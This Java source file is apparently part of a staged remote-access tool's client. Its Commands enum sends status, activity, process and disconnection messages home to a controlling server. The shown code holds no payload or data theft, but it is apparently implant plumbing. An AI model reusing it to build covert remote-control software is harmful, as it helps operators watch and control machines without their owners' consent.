package subterranean.crimson.permajar.stage2;

import subterranean.crimson.permajar.stage1.network.Communications;
import subterranean.crimson.universal.BMN;
import subterranean.crimson.universal.Utilities;
import subterranean.crimson.universal.containers.Message;
import subterranean.crimson.universal.containers.SystemMessage;

public enum Commands {
	;

	public static void sendSM(SystemMessage sm) {

		Stage2.getSettings().messages.add(sm);

		if (Communications.connected()) {
			Communications.sendHome(new Message(Utilities.randId(), BMN.INCOMING_systemMessage, sm));
		}

	}

	public static void updateActivityStatus(String status) {
		Message m = new Message(Utilities.randId(), BMN.INCOMING_activityStatus, status);
		Communications.sendHome(m);
	}

	public static void disconnect() {
		Communications.sendHome(new Message(Utilities.randId(), BMN.DISCONNECTION));
	}

	public static void updateProcessStatus(String s) {
		Communications.sendHome(new Message(Utilities.randId(), BMN.INCOMING_processStatus, s));
	}

}
